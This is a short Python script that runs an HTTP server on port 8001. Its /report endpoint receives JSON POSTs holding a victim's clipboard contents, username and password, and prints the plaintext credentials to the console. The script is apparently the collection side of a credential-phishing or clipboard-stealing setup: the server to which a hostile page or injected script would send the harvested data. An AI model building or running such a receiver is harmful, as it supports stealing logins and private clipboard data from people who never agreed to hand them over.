import http.server
import socketserver
import json

# Directory to serve files from
DIRECTORY = "./"

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def translate_path(self, path):
        """Ensure the handler serves files from the DIRECTORY variable."""
        return super().translate_path(path)

    def do_POST(self):
        if self.path == '/report':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # Log received data
            print("Data received:")
            if 'clipboard' in data:
                clipboard_content = data['clipboard']
                formatted_clipboard = '\n  '.join(clipboard_content.splitlines())
                print(f"Clipboard content:\n  {formatted_clipboard}")
            if 'username' in data and 'password' in data:
                username = data['username']
                password = data['password']
                print(f"Username: {username}")
                print(f"Password: {password}")
            
            self.send_response(200)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

# Start the server
PORT = 8001
with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
    print(f"Serving at http://0.0.0.0:{PORT}")
    httpd.serve_forever()
